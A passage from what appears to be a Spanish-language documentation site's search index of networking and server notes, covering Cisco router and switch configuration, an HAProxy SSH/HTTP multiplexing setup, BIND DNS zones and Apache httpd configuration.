los demas routers, para automatizar la tablas. Router0 ( confi ) # Router rip Router0 ( dhcp-confi ) # network 163.27.176.0 Router0 ( dhcp-confi ) # network 163.27.240.0 Router0 ( dhcp-confi ) # Passive-interface f0/0 Router0 ( dhcp-confi ) # Passive-interface f0/1 Router0 ( dhcp-confi ) # version 2 passive-interface nos ofrece el no mandar mensages por esa interficie, se utiliza en redes finales. show ip rip database consultar la base de datos.","title":"Rip"},{"location":"administracion/redes/comandos_router_switch/#contrasenas","text":"Contrase\u00f1a en el login de entrada R1 ( config ) #line console 0 R1 ( config-line ) #password passcon R1 ( config-line ) #login","title":"Contrase\u00f1as"},{"location":"administracion/redes/comandos_router_switch/#contrasena-de-la-configuracion","text":"Router ( config ) # enable secret XXXX # establecer password cifrada a configuraci\u00f3n Contrase\u00f1a acceso al router remotamente. si no establecemos una contrase\u00f1a por esta via no se podr\u00e1 acceder remotamente. R1 ( config ) #line vty 0 4 R1 ( config-line ) #password passvty R1 ( config-line ) #login","title":"Contrase\u00f1a de la configuraci\u00f3n"},{"location":"administracion/redes/comandos_router_switch/#informacion-configuracion","text":"Router# show ? # indica que comandos existen con show Router# show interfaces # muestra interfaces Router# show interfaces serial 0 /0/0 # muestra interfaces serial Router# show versi\u00f3n # muestra versi\u00f3n del cisco. Router# show ip interfaces serial 0 /0/0 # muestra interfaces serial Router# show ip interfaces brief # muestra las conexiones ( activadas, desactivadas) Router# show arp # tabla de macs, ips Router# startup-config # muestra la configuraci\u00f3n guardada. Router# show ip route # muestra tablas de enrutamiento Router# show ip dhcp binding # conf de dhcp Router# show ip rip database # consultar base de datos rip","title":"Informaci\u00f3n configuraci\u00f3n"},{"location":"administracion/redes/comandos_router_switch/#tablas-de-enrutamiento","text":"Conectadas directamente Las que detecta el router directamente por que estan conectadas directamente Estaticas Las que a\u00f1ado manualmente Dinamicas Se comunican tre routers y establecen sus tablas Por defecto la ruta de salir si no conoce la red 0.0.0.0/0 communtacion. pc1 se comunica con pc2 en otra red. pc1 mira si la ip pertenece a su red mira si tiene la mac en la cache de arp, si no, busca al geatwey. si no pertenece busca la red en el gateway los gateways tienen unav mac por cada interficie","title":"Tablas de enrutamiento"},{"location":"administracion/redes/comandos_router_switch/#comandos-switch","text":"Los comandos de switch son como el router con algunos extras. interface range fastEthernet 0 /5 - 24 # acceder a un rango de interficies ( util para cerrar puertos ) mac-address-table static 0010 .1112.39A3 vlan 1 interface f0/1 # asignar mac statica en puerto show mac-address-table # mostrar tabla arp","title":"Comandos switch"},{"location":"administracion/redes/comandos_router_switch/#configuracio-i-consulta-de-la-taula-mac","text":"#Modificaci \u0301o del temps d\u2019expiraci \u0301o de les MAC din`amiques Switch ( config ) mac-address-table aging-time NUM #Configuraci \u0301o d\u2019una MAC est`atica (MAC en format XXXX.YYYY.ZZZZ) Switch ( config ) mac-address-table static MAC vlan { 1 -4096, ALL } interface NOM #Eliminaci \u0301o d\u2019una MAC est`atica Switch ( config ) no mac-address-table static MAC vlan { 1 -4096, ALL } interface NOM Switch ( config ) show mac-address-table","title":"Configuracio i consulta de la Taula MAC"},{"location":"administracion/redes/comandos_router_switch/#vlan_1","text":"Crear vlan Switch ( config ) # vlan ID Switch ( config-vlan ) # name NOM #Creaci \u0301o d\u2019un conjunt de VLANs Switch ( config ) # vlan ID1, ID2, ID3 #Creaci \u0301o d\u2019un rang de VLANs Switch ( config ) # vlan ID1-ID2","title":"Vlan"},{"location":"administracion/redes/comandos_router_switch/#mode-acces","text":"Switch ( config ) # interface NOM Switch ( config-if ) # switchport mode access Switch ( config-if ) # switchport access vlan ID","title":"Mode acces"},{"location":"administracion/redes/comandos_router_switch/#eliminar-access","text":"Switch ( config ) # interface NOM Switch ( config-if ) # no switchport access vlan","title":"Eliminar access"},{"location":"administracion/redes/comandos_router_switch/#trunk","text":"Switch ( config ) interface NOM Switch ( config-if ) switchport mode trunk Switch ( config-if ) switchport trunk native vlan ID #Opcional #Nomes permet l\u2019acces a la VLAN ID Switch ( config-if ) switchport trunk allowed vlan ID #Nomes permet l\u2019acces a les VLANs ID1, ID2 i ID3 Switch ( config-if ) switchport trunk allowed vlan ID1,ID2,ID3 #Nomes permet l\u2019acces a les VLANs del rang ID1-ID2 Switch ( config-if ) switchport trunk allowed vlan ID1-ID2 #Afegeix la VLAN ID a les ja permeses en el trunk Switch ( config-if ) switchport trunk allowed vlan add ID # quitar vlan de puerto trunk Switch ( config-if ) switchport trunk allowed vlan remove ID","title":"Trunk"},{"location":"administracion/redes/comandos_router_switch/#eliminar-trunk","text":"Switch ( config ) # interface NOM Switch ( config-if ) # no switchport trunk allowed vlan Switch ( config-if ) # no switchport trunk native vlan Switch ( config-if ) # switchport mode access","title":"Eliminar trunk"},{"location":"administracion/redes/comandos_router_switch/#stp","text":"A\u00f1adir Bridge Root, cabeza en arbol de prioridad. Switch0 ( config ) #spanning-tree vlan 1 root primary Switch0#show spanning-tree active Switch0#show spanning-tree detail","title":"Stp"},{"location":"administracion/redes/comandos_router_switch/#ip-switch","text":"asignar una ip a un switch config t interface vlan 1 ip address 192 .168.1.1 255 .255.255.0","title":"Ip switch"},{"location":"administracion/redes/comandos_router_switch/#mostrar","text":"Switch# show vlan Switch# show vlan brief Switch# show interface trunk Switch# show interface vlan 1","title":"Mostrar"},{"location":"administracion/redes/haproxy/","text":"Haproxy Haproxy es un programa que te permite balancear la carga de TCP/UDP, una de sus grandes utilidades es la redirecci\u00f3n de puertos, de esta manera con tener un solo puerto abierto podemos servir todas nuestras aplicaciones al exterior. Link de donde se extrajo la informaci\u00f3n /etc/haproxy/haproxy.cfg global log /dev/log local0 log /dev/log local1 notice chroot /var/lib/haproxy stats socket /run/haproxy/admin.sock mode 660 level admin stats timeout 30s user haproxy group haproxy daemon # Default SSL material locations ca-base /etc/ssl/certs crt-base /etc/ssl/private # Default ciphers to use on SSL-enabled listening sockets. # For more information, see ciphers(1SSL). This list is from: # https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/ # An alternative list with additional directives can be obtained from # https://mozilla.github.io/server-side-tls/ssl-config-generator/?server=haproxy ssl-default-bind-ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:RSA+AESGCM:RSA+AES:!aNULL:!MD5:!DSS ssl-default-bind-options no-sslv3 defaults log global mode http option httplog option dontlognull timeout connect 5000 timeout client 50000 timeout server 50000 errorfile 400 /etc/haproxy/errors/400.http errorfile 403 /etc/haproxy/errors/403.http errorfile 408 /etc/haproxy/errors/408.http errorfile 500 /etc/haproxy/errors/500.http errorfile 502 /etc/haproxy/errors/502.http errorfile 503 /etc/haproxy/errors/503.http errorfile 504 /etc/haproxy/errors/504.http frontend ssl bind *:80 mode tcp option tcplog tcp-request inspect-delay 5s tcp-request content accept if HTTP # capta sinla petici\u00f3n es ssh acl client_attempts_ssh payload ( 0 ,7 ) -m bin 5353482d322e30 use_backend ssh if !HTTP use_backend ssh if client_attempts_ssh #use_backend secure_http if HTTP # seg\u00fan el dominio nde petici\u00f3n redirecciona al backend indicado. acl is-tk hdr ( host ) -i jorgepastorr.tk:50022 acl is-docs hdr ( host ) -i docs.jorgepastorr.tk:50022 use_backend docs if is-tk use_backend docs if is-docs backend ssh mode tcp option tcplog server ssh 127 .0.0.1:22 timeout server 2h backend docs reqadd X-Forwarded-Proto: \\ https rspadd Strict-Transport-Security: \\ max-age = 31536000 mode http option httplog option forwardfor server local_http_server 127 .0.0.1:8000 ``` autorizo la conexi\u00f3n ssh desde el dominio indicado en el usuario pi. ``` bash pi@raspberryJorge:~ $ cat ~/.ssh/config Host jorgepastorr.tk ProxyCommand openssl s_client -connect jorgepastorr.tk:50022 -quiet","title":"Haproxy"},{"location":"administracion/redes/haproxy/#haproxy","text":"Haproxy es un programa que te permite balancear la carga de TCP/UDP, una de sus grandes utilidades es la redirecci\u00f3n de puertos, de esta manera con tener un solo puerto abierto podemos servir todas nuestras aplicaciones al exterior. Link de donde se extrajo la informaci\u00f3n /etc/haproxy/haproxy.cfg global log /dev/log local0 log /dev/log local1 notice chroot /var/lib/haproxy stats socket /run/haproxy/admin.sock mode 660 level admin stats timeout 30s user haproxy group haproxy daemon # Default SSL material locations ca-base /etc/ssl/certs crt-base /etc/ssl/private # Default ciphers to use on SSL-enabled listening sockets. # For more information, see ciphers(1SSL). This list is from: # https://hynek.me/articles/hardening-your-web-servers-ssl-ciphers/ # An alternative list with additional directives can be obtained from # https://mozilla.github.io/server-side-tls/ssl-config-generator/?server=haproxy ssl-default-bind-ciphers ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:ECDH+AES128:DH+AES:RSA+AESGCM:RSA+AES:!aNULL:!MD5:!DSS ssl-default-bind-options no-sslv3 defaults log global mode http option httplog option dontlognull timeout connect 5000 timeout client 50000 timeout server 50000 errorfile 400 /etc/haproxy/errors/400.http errorfile 403 /etc/haproxy/errors/403.http errorfile 408 /etc/haproxy/errors/408.http errorfile 500 /etc/haproxy/errors/500.http errorfile 502 /etc/haproxy/errors/502.http errorfile 503 /etc/haproxy/errors/503.http errorfile 504 /etc/haproxy/errors/504.http frontend ssl bind *:80 mode tcp option tcplog tcp-request inspect-delay 5s tcp-request content accept if HTTP # capta sinla petici\u00f3n es ssh acl client_attempts_ssh payload ( 0 ,7 ) -m bin 5353482d322e30 use_backend ssh if !HTTP use_backend ssh if client_attempts_ssh #use_backend secure_http if HTTP # seg\u00fan el dominio nde petici\u00f3n redirecciona al backend indicado. acl is-tk hdr ( host ) -i jorgepastorr.tk:50022 acl is-docs hdr ( host ) -i docs.jorgepastorr.tk:50022 use_backend docs if is-tk use_backend docs if is-docs backend ssh mode tcp option tcplog server ssh 127 .0.0.1:22 timeout server 2h backend docs reqadd X-Forwarded-Proto: \\ https rspadd Strict-Transport-Security: \\ max-age = 31536000 mode http option httplog option forwardfor server local_http_server 127 .0.0.1:8000 ``` autorizo la conexi\u00f3n ssh desde el dominio indicado en el usuario pi. ``` bash pi@raspberryJorge:~ $ cat ~/.ssh/config Host jorgepastorr.tk ProxyCommand openssl s_client -connect jorgepastorr.tk:50022 -quiet","title":"Haproxy"},{"location":"administracion/redes/redes2/","text":"# usage prog hostname from socket import gethostbyname hostname = sys . argv [ 1 ] ip = gethostbyname ( hostname ) print ( \" %s \" % ( ip ,)) file:///usr/share/doc/python3-docs/html/library/socket.html other functions python3-docs DNS dns es protocolo binario Dns utiliza el paquete bind , que este contiene el servicio named y a dicho servicio se puede interactuar en caliente con el comando rndc . Algunas opciones de named . named -c config-file named -d debug-level [ 0 -15 ] named -f -g logs en foreground convinado con debug level puede ayudar named -L /dev/sdtderr named -u ( user ) por defecto named Configuraci\u00f3n /etc/named/ /var/named/ Utilidades para resoluciones de dns. dnf install -y bind-utils nslookup y host por defecto no miran el archivo /etc/hosts dig yahoo.es +short # poner por defecto salida corta ~/.digrc +short dig -x 8 .8.8.8 @server Documentaci\u00f3n oficial Al instalar el paquete bind, este descarga toda su documentaci\u00f3n doc original /usr/share/doc/bind/Bv9ARM.html /usr/share/doc/bind/Bv9ARM.pdf ejemplos /usr/share/doc/bind/shample Estad\u00edsticas Generar estad\u00edsticas del trafico del dns Siempre que este la siguiente opci\u00f3n en /etc/named.conf ... statistics-file \"/var/named/data/named_stats.txt\" ; ... systemctl start named # con el servicio activo rndc stats # activar estadisticas observar resultado en el archivo indicado cat /var/named/data/named_stats.txt acl Definir un alias a una o varias series de ip acl aula { 10 .200.243.0/24 ; } ; options { listen-on port 53 { 127 .0.0.1 ; 10 .200.243.209 ; } ; directory \"/var/named\" ; dump-file \"/var/named/data/cache_dump.db\" ; statistics-file \"/var/named/data/named_stats.txt\" ; memstatistics-file \"/var/named/data/named_mem_stats.txt\" ; allow-query { localhost ; aula ; } ; Reenv\u00edo forwarder forward only ; forwarders { 10 .1.1.200 ; } ; recursion yes ; La opci\u00f3n de forward , con only mandara autom\u00e1ticamente las peticiones al servidor externo sin intentarlas resolver el mismo, se puede a\u00f1adir first opci\u00f3n por defecto y si no encuentra respuesta exteriormente busca en las zonas internas. Barrar cache rndc flush Zonas Un fichero de zona es una lista de resource-records . que llega a ser una lista de resoluciones ip-dominio y viceversa. En el archivo named.conf se definen dos zonas la directa y la inversa: # directa zone \"lacasitos.com\" IN { type master ; file \"lacasitos.com.zone\" ; } # inversa zone \"243.200.10.in-addr.arpa\" IN { type master ; file \"lacasitos.com.rev.zone\" ; } Importante : Zona directa se define con el dominio principal, esta se encargara de resolver dominios a ip. mientras que la zona inversa se define con la ip del servidor del rev\u00e9s hasta el octeto cambiante seguido de in-addr.arpa , esta zona se encarga de las resoluciones ip a dominio. los archivos de zona si se definen con ruta parcial se dev\u00e9n encontrar en el directorio establecido por directory \"/var/named\"; . Las lineas de archivos de zona se definen por los elementos name, ttl, record class, record type, record data si no se especifica un campo se recoge el definido global mente al inicio del archivo o el de la linea anterior. name TTL tiempo de vida record class clase de registro record type tipo de registro SOA, A, AAAA, CNAME, PTR, MX ... record data los datos de registro podr\u00e1n consistir de uno o mas elementos de informaci\u00f3n dependiendo de el tipo de registro. Como m\u00ednimo un archivo de zona debe especificar el inicio de autoridad (SOA) con el nombre de servidor maestro la direcci\u00f3n de correo de la persona responsable y la lista de argumentos de tiempo de caducidad. # origin class type server-fqdn mail arguments @ IN SOA jorge.lacasitos.com. mailhost.lacasitos.com. ( 0 1D 1H 1W 3H ) lacasitos.com.zone ; file lacasitos.com $ORIGIN lacasitos.com. $TTL 1D @ IN SOA jorge.lacasitos.com. mailhost.lacasitos.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum ; DNS NS Records @ IN NS jorge.lacasitos.com. ; DND A records marc IN A 10 .200.243.208 jorge IN A 10 .200.243.209 pau IN A 10 .200.243.210 supertux IN CNAME jorge Caracter\u00edsticas de archivo El punto final especifica que es un nombre completo en el caso de no estar se le a\u00f1adir\u00e1 el dominio seguidamente. @ IN NS jorge.lacasitos.com. = @ IN NS jorge @ IN NS jorge.lacasitos.com = @ IN NS jorge.lacasitos.com.lacasitos.com. Si no se define $ORIGIN se coger\u00e1 el valor del nombre de zona La @ es substituye por el valor de ORIGIN El nombre del servidor a de estar definido tanto en el SOA, NS, A . El archivo de zona inversa los registros SOA y NS ser\u00e1n exactamente iguales, y a\u00f1adiremos la lista de resoluciones inversas con el octeto/s faltan-te en el nombre de la zona seguido de su dominio. lacasitos.com.rev.zone ; file zone 243 .200.10 $TTL 1D @ IN SOA jorge.lacasitos.com. mailhost.lacasitos.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum ; DNS NS records @ NS jorge.lacasitos.com. ; DNS PTR records 208 IN PTR marc.lacasitos.com. 209 IN PTR jorge.lacasitos.com. 210 IN PTR pau.lacasitos.com. backup zonas Se puede hacer un backup de zonas y visualizar las zonas con: rndc dumpdb -zones less /var/named/data/cache_dump.db Este archivo puede variar de localizaci\u00f3n seg\u00fan el par\u00e1metro dump-file en el archivo named.conf . O a una sola zona con: # directa named-compilezone -o backup_zona.txt informatica.escoladeltreball.org informatica.escoladeltreball.org.zone # inversa named-checkzone -o backup_zona.txt 200 .10.in-addr.arpa informatica.escoladeltreball.org.rev.zone Generate En ocasiones tenemos muchos registros muy similares y repetitivos, con generate podemos ahorrar de escribir m\u00faltiples registros y escribir solo uno. $ORIGIN informatica.escoladeltreball.org. $TTL 1D @ IN SOA jorge.informatica.escoladeltreball.org. adminmail.informatica.escoladeltreball.org. 0 1D 1H 1W 3H ; DNS NS Records @ IN NS jorge.informatica.escoladeltreball.org. ; DND A records jorge IN A 10.200.243.209 ; Eestacions aula N2H (30 ordinadors) h01 IN A 10.200.242.201 h02 IN A 10.200.242.202 h03 IN A 10.200.242.203 ... Es lo mismo que: $ORIGIN informatica.escoladeltreball.org. $TTL 1D @ IN SOA jorge.informatica.escoladeltreball.org. adminmail.informatica.escoladeltreball.org. 0 1D 1H 1W 3H ; DNS NS Records @ IN NS jorge.informatica.escoladeltreball.org. ; DND A records jorge IN A 10.200.243.209 ; Eestacions aula N2H (30 ordinadors) $GENERATE 1-30 h${0,2,d} IN A 10.200.242.2${0,2,d} Sintaxis : $GENERATE range lhs[ttl] [class]type rhs[comment] range acepta saltos en la secuencia 2-10/2 suma de dos en dos ${offset[,width[,base]]} Por defecto la generaci\u00f3n es ${0,0,d} es decir {0 valores a sumar o restar, 0 longitud del valor, base decimal} . Http una transmision consiste en 2 mensajes primera linea especial seguida de 0 o mas cabeceras GET /path/file HTTP/1.0 metodo get es siempre sin cuerpo, final de linea es cd y rf \\r\\n curl -s -D /dev/stderr http://seat.es > /dev/null HTTP/1.1 301 Moved Permanently Date: Tue, 19 Nov 2019 10 :57:53 GMT Location: https://www.seat.es/ Content-Length: 228 Content-Type: text/html ; charset = iso-8859-1 Set-Cookie: TS0177e393 = 012f656eaa20722a90edef1d916342e21c1021f54ea8f278cfb73d1720c7998c2394aea1eb5368826345d7be0f88e1232fd6f8f377 ; Path = / /usr/share/doc/python3-docs/html/index.html Directorios /usr/share/httpd/manual/index.html # manual /etc/httpd/conf/httpd.conf # configuraci\u00f3n /etc/httpd/modules # modulos instalados /var/www/html # directorio publicaci\u00f3n por defecto logs sudo tail -f /etc/httpd/logs/error_log sudo tail -f /etc/httpd/logs/access_log Configuraci\u00f3n include a directorio en el home apachectl -t verifica ficheros de configuraci\u00f3n execcgi quitar si no quiero ejecutables Alias https://httpd.apache.org/docs/2.4/es/mod/mod_alias.html https://httpd.apache.org/docs/2.4/es/mod/core.html#options Alias \"/python\" \"/usr/share/doc/python3-docs/html\" <Directory \"/usr/share/doc/python3-docs/html\" > Options +Indexes -ExecCGI -FollowSymLinks Require all granted </Directory> Userdir https://httpd.apache.org/docs/2.4/es/mod/mod_userdir.html#userdir https://httpd.apache.org/docs/2.4/es/howto/public_html.html <IfModule mod_userdir.c> UserDir \"public_html\" UserDir enabled isx47787241 </IfModule> <Directory \"/home/users/inf/hisx2/isx47787241/public_html\"> AllowOverride FileInfo AuthConfig Limit Indexes Options MultiViews Indexes SymLinksIfOwnerMatch IncludesNoExec Require method GET POST OPTIONS </Directory> verificar que tenemos los permisos de acceso, almenos 711 hasta el home. y el directorio public_html 755. Ya podemos acceder desde localhost/~jorge Para evitar poner la tilde, usar la expresi\u00f3n regular siguiente en la configuraci\u00f3n. RewriteEngine on RewriteRule ^/personal/ ([ a-z0-9 ] + ) /~ $1 [ R ] Includes https://httpd.apache.org/docs/2.4/es/mod/mod_include.html Alias \"/data\" \"/home/users/inf/hisx2/isx47787241/public_data\" <Directory \"/home/users/inf/hisx2/isx47787241/public_data\" > AddType text/html .html AddOutputFilter INCLUDES ; DEFLATE .html Options +Indexes -ExecCGI -FollowSymLinks +IncludesNoExec Require all granted </Directory> public_data \u251c\u2500\u2500 head.html \u2514\u2500\u2500 index.html index.html <!--#include file=\"head.html\" --> <!--#fsize file=\"head.html\" --> < p > hola mundo </ p > < pre > <!--#printenv --> </ pre > VirtualHost https://httpd.apache.org/docs/current/mod/core.html#virtualhost https://httpd.apache.org/docs/2.4/vhosts/examples.html Virtualhost permite servir diferentes paginas desde un mismo host, esto lo hace mirando que tipo de servername le llega en la url, y desde ah\u00ed, distribuye la pagina adecuada. A\u00f1adir a /etc/hosts o dns la ip de virtual host y el alias. ... 192 .168.88.2 jorge.com a\u00f1adir sede virtual al archivo /etc/httpd/conf/httpd.conf # sede virtal <VirtualHost 192 .168.88.2:80> ServerName jorge.com DocumentRoot \"/home/debian/apache/vhost\" </VirtualHost> # permisos de acceso al directorio <Directory \"/home/debian/apache/vhost\" > Options +Indexes -ExecCGI -FollowSymLinks Require all granted </Directory> Indexes La opci\u00f3n Indexes permite en el caso de no encontrar un archivo index.html mostrar la p\u00e1gina como si fuera un ftp. Es necesario comentar o renombrar el archivo /etc/http/conf.d/welcom.conf ya que por defecto, si no encuentra la p\u00e1gina index.html lo redirige a la p\u00e1gina de muestra apache2. <Directory \"/home/users/inf/hisx2/isx47787241/public_data\" > AddType text/html .html AddOutputFilter INCLUDES ; DEFLATE .html Options +Indexes -ExecCGI -FollowSymLinks +IncludesNoExec Require all granted </Directory> Directorio de ejecutables ExecCGI permite ejecutar archivos y ScriptAlias define un directorio de ejecutables. # conf directorio ejecutable ScriptAlias \"/a\" \"/home/users/inf/hisx2/isx47787241/apache/scripts\" <Directory \"/home/users/inf/hisx2/isx47787241/apache/scripts\" > Options +ExecCGI AddHandler cgi-script .sh .py Require all granted </Directory> Mezcla directorio donde se mezclan archivos ejecutbles con normales html. Alias \"/app\" \"/home/users/inf/hisx2/isx47787241/apache/app1\" <Directory \"/home/users/inf/hisx2/isx47787241/apache/app1\" > Options +Indexes +ExecCGI -FollowSymLinks AddHandler cgi-script .sh Require all granted </Directory> http-referer get acaba en cr lf y post en cos body tipo mime de post CONTENT_TYPE=application/x-www-form-urlencoded get curl --silent --dump-header /dev/stderr http://www.escoladeltreball.org > /dev/null post clear;curl --silent --dump-header --data -d @filename http://localhost/app2/script/dump.py Auth usuarios Generar archivo de contrase\u00f1as de usuarios. htpasswd -b -c passwd pepe contrasena Adding password for user pepe htpasswd -b passwd pepe2 contrasena Adding password for user pepe2 configuraci\u00f3n directorio Alias \"/data\" \"/home/users/inf/hisx2/isxXXXXXXX/public_data\" <Directory \"/home/users/inf/hisx2/isxXXXXXXX/public_data\" > Options +Indexes -ExecCGI -FollowSymLinks Authtype Basic AuthName \"Acces a usuarios\" AuthBasicProvider file AuthUserFile /home/users/inf/hisx2/isxXXXXXXX/apache/passwd Require valid-user </Directory> Auto detectar idioma Con esta configuraci\u00f3n el navegador recoger\u00e1 el index.html con el idioma predefinido por el mismo. idiomas \u251c\u2500\u2500 index.html.en \u251c\u2500\u2500 index.html.es \u2514\u2500\u2500 index.html.ca Las opciones que hacen funcioar esto son +MultiViews, LanguagePriority, ForceLanguagePriority Alias \"/idiomas\" \"/home/debian/apache/idiomas\" <Directory \"/home/debian/apache/idiomas\" > LanguagePriority en ca es ForceLanguagePriority Fallback Options -Indexes -ExecCGI -FollowSymLinks +MultiViews Require all granted </Directory> Likes el enlace img llama a un script para ejecutar algo antes de mistrarte la imagen apache.conf Alias \"/like\" \"/home/users/inf/hisx2/isx47787241/apache/like\" <Directory \"/home/users/inf/hisx2/isx47787241/apache/like\" > AddType text/html .html Options +Indexes +ExecCGI -FollowSymLinks -IncludesNoExec Require all granted </Directory> index.html <p>hola like</p> <img src = '/cgi-bin/dump.sh' /> dump.sh #!/usr/bin/bash echo $REMOTE_ADDR >> /var/likes/bigdata echo 'Content-Type: image/png; charset=UTF-8' echo cat /home/users/inf/hisx2/isx47787241/Descargas/index.png #!/usr/bin/bash echo $REMOTE_ADDR >> /var/likes/bigdata echo 'Status: 302' echo 'Location: https://upload.wikimedia.org/wikipedia/commons/1/13/Facebook_like_thumb.png' echo","title":"Redes2"},{"location":"administracion/redes/redes2/#dns","text":"dns es protocolo binario Dns utiliza el paquete bind , que este contiene el servicio named y a dicho servicio se puede interactuar en caliente con el comando rndc . Algunas opciones de named . named -c config-file named -d debug-level [ 0 -15 ] named -f -g logs en foreground convinado con debug level puede ayudar named -L /dev/sdtderr named -u ( user ) por defecto named","title":"DNS"},{"location":"administracion/redes/redes2/#configuracion","text":"/etc/named/ /var/named/","title":"Configuraci\u00f3n"},{"location":"administracion/redes/redes2/#utilidades-para-resoluciones-de-dns","text":"dnf install -y bind-utils nslookup y host por defecto no miran el archivo /etc/hosts dig yahoo.es +short # poner por defecto salida corta ~/.digrc +short dig -x 8 .8.8.8 @server","title":"Utilidades para resoluciones de dns."},{"location":"administracion/redes/redes2/#documentacion-oficial","text":"Al instalar el paquete bind, este descarga toda su documentaci\u00f3n doc original /usr/share/doc/bind/Bv9ARM.html /usr/share/doc/bind/Bv9ARM.pdf ejemplos /usr/share/doc/bind/shample","title":"Documentaci\u00f3n oficial"},{"location":"administracion/redes/redes2/#estadisticas","text":"Generar estad\u00edsticas del trafico del dns Siempre que este la siguiente opci\u00f3n en /etc/named.conf ... statistics-file \"/var/named/data/named_stats.txt\" ; ... systemctl start named # con el servicio activo rndc stats # activar estadisticas observar resultado en el archivo indicado cat /var/named/data/named_stats.txt","title":"Estad\u00edsticas"},{"location":"administracion/redes/redes2/#acl","text":"Definir un alias a una o varias series de ip acl aula { 10 .200.243.0/24 ; } ; options { listen-on port 53 { 127 .0.0.1 ; 10 .200.243.209 ; } ; directory \"/var/named\" ; dump-file \"/var/named/data/cache_dump.db\" ; statistics-file \"/var/named/data/named_stats.txt\" ; memstatistics-file \"/var/named/data/named_mem_stats.txt\" ; allow-query { localhost ; aula ; } ;","title":"acl"},{"location":"administracion/redes/redes2/#reenvio-forwarder","text":"forward only ; forwarders { 10 .1.1.200 ; } ; recursion yes ; La opci\u00f3n de forward , con only mandara autom\u00e1ticamente las peticiones al servidor externo sin intentarlas resolver el mismo, se puede a\u00f1adir first opci\u00f3n por defecto y si no encuentra respuesta exteriormente busca en las zonas internas.","title":"Reenv\u00edo forwarder"},{"location":"administracion/redes/redes2/#barrar-cache","text":"rndc flush","title":"Barrar cache"},{"location":"administracion/redes/redes2/#zonas","text":"Un fichero de zona es una lista de resource-records . que llega a ser una lista de resoluciones ip-dominio y viceversa. En el archivo named.conf se definen dos zonas la directa y la inversa: # directa zone \"lacasitos.com\" IN { type master ; file \"lacasitos.com.zone\" ; } # inversa zone \"243.200.10.in-addr.arpa\" IN { type master ; file \"lacasitos.com.rev.zone\" ; } Importante : Zona directa se define con el dominio principal, esta se encargara de resolver dominios a ip. mientras que la zona inversa se define con la ip del servidor del rev\u00e9s hasta el octeto cambiante seguido de in-addr.arpa , esta zona se encarga de las resoluciones ip a dominio. los archivos de zona si se definen con ruta parcial se dev\u00e9n encontrar en el directorio establecido por directory \"/var/named\"; . Las lineas de archivos de zona se definen por los elementos name, ttl, record class, record type, record data si no se especifica un campo se recoge el definido global mente al inicio del archivo o el de la linea anterior. name TTL tiempo de vida record class clase de registro record type tipo de registro SOA, A, AAAA, CNAME, PTR, MX ... record data los datos de registro podr\u00e1n consistir de uno o mas elementos de informaci\u00f3n dependiendo de el tipo de registro. Como m\u00ednimo un archivo de zona debe especificar el inicio de autoridad (SOA) con el nombre de servidor maestro la direcci\u00f3n de correo de la persona responsable y la lista de argumentos de tiempo de caducidad. # origin class type server-fqdn mail arguments @ IN SOA jorge.lacasitos.com. mailhost.lacasitos.com. ( 0 1D 1H 1W 3H ) lacasitos.com.zone ; file lacasitos.com $ORIGIN lacasitos.com. $TTL 1D @ IN SOA jorge.lacasitos.com. mailhost.lacasitos.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum ; DNS NS Records @ IN NS jorge.lacasitos.com. ; DND A records marc IN A 10 .200.243.208 jorge IN A 10 .200.243.209 pau IN A 10 .200.243.210 supertux IN CNAME jorge Caracter\u00edsticas de archivo El punto final especifica que es un nombre completo en el caso de no estar se le a\u00f1adir\u00e1 el dominio seguidamente. @ IN NS jorge.lacasitos.com. = @ IN NS jorge @ IN NS jorge.lacasitos.com = @ IN NS jorge.lacasitos.com.lacasitos.com. Si no se define $ORIGIN se coger\u00e1 el valor del nombre de zona La @ es substituye por el valor de ORIGIN El nombre del servidor a de estar definido tanto en el SOA, NS, A . El archivo de zona inversa los registros SOA y NS ser\u00e1n exactamente iguales, y a\u00f1adiremos la lista de resoluciones inversas con el octeto/s faltan-te en el nombre de la zona seguido de su dominio. lacasitos.com.rev.zone ; file zone 243 .200.10 $TTL 1D @ IN SOA jorge.lacasitos.com. mailhost.lacasitos.com. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum ; DNS NS records @ NS jorge.lacasitos.com. ; DNS PTR records 208 IN PTR marc.lacasitos.com. 209 IN PTR jorge.lacasitos.com. 210 IN PTR pau.lacasitos.com.","title":"Zonas"},{"location":"administracion/redes/redes2/#backup-zonas","text":"Se puede hacer un backup de zonas y visualizar las zonas con: rndc dumpdb -zones less /var/named/data/cache_dump.db Este archivo puede variar de localizaci\u00f3n seg\u00fan el par\u00e1metro dump-file en el archivo named.conf . O a una sola zona con: # directa named-compilezone -o backup_zona.txt informatica.escoladeltreball.org informatica.escoladeltreball.org.zone # inversa named-checkzone -o backup_zona.txt 200 .10.in-addr.arpa informatica.escoladeltreball.org.rev.zone","title":"backup zonas"},{"location":"administracion/redes/redes2/#generate","text":"En ocasiones tenemos muchos registros muy similares y repetitivos, con generate podemos ahorrar de escribir m\u00faltiples registros y escribir solo uno. $ORIGIN informatica.escoladeltreball.org. $TTL 1D @ IN SOA jorge.informatica.escoladeltreball.org. adminmail.informatica.escoladeltreball.org. 0 1D 1H 1W 3H ; DNS NS Records @ IN NS jorge.informatica.escoladeltreball.org. ; DND A records jorge IN A 10.200.243.209 ; Eestacions aula N2H (30 ordinadors) h01 IN A 10.200.242.201 h02 IN A 10.200.242.202 h03 IN A 10.200.242.203 ... Es lo mismo que: $ORIGIN informatica.escoladeltreball.org. $TTL 1D @ IN SOA jorge.informatica.escoladeltreball.org. adminmail.informatica.escoladeltreball.org. 0 1D 1H 1W 3H ; DNS NS Records @ IN NS jorge.informatica.escoladeltreball.org. ; DND A records jorge IN A 10.200.243.209 ; Eestacions aula N2H (30 ordinadors) $GENERATE 1-30 h${0,2,d} IN A 10.200.242.2${0,2,d} Sintaxis : $GENERATE range lhs[ttl] [class]type rhs[comment] range acepta saltos en la secuencia 2-10/2 suma de dos en dos ${offset[,width[,base]]} Por defecto la generaci\u00f3n es ${0,0,d} es decir {0 valores a sumar o restar, 0 longitud del valor, base decimal} .","title":"Generate"},{"location":"administracion/redes/redes2/#http","text":"una transmision consiste en 2 mensajes primera linea especial 